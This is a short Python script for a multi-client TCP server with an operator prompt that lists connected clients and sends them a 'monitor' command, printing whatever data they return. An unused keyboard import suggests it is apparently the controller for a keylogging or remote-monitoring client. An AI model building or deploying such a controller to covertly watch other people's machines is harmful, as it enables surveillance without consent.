import socket
import threading
import keyboard

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("127.0.0.1", 62121))

clients_conn_list = []
clients_addr_list = []

def process_input():
    while True:
        input_data = input(">> ")
        if input_data == "list":
            print("")
            for x in range(0, len(clients_addr_list)):
                print("[" + str(x) + "] " + "-"*6)
                print(" "*2 + clients_addr_list[x][0])
                print(" "*2 + str(clients_addr_list[x][1]))
            print("")
        elif "monitor" in input_data:
            target = int(input_data.replace("monitor ", ""))
            try:
                clients_conn_list[target].sendall(("monitor").encode("utf-8"))
                monitor_data = (clients_conn_list[target].recv(67108864)).decode("utf-8")
                print(monitor_data)
                print("Sent monitor command")
            except:
                clients_conn_list.pop(target)
                clients_addr_list.pop(target)

threading.Thread(target = process_input).start()

while True:
    s.listen()
    conn, addr = s.accept()
    clients_conn_list.append(conn)
    clients_addr_list.append(addr)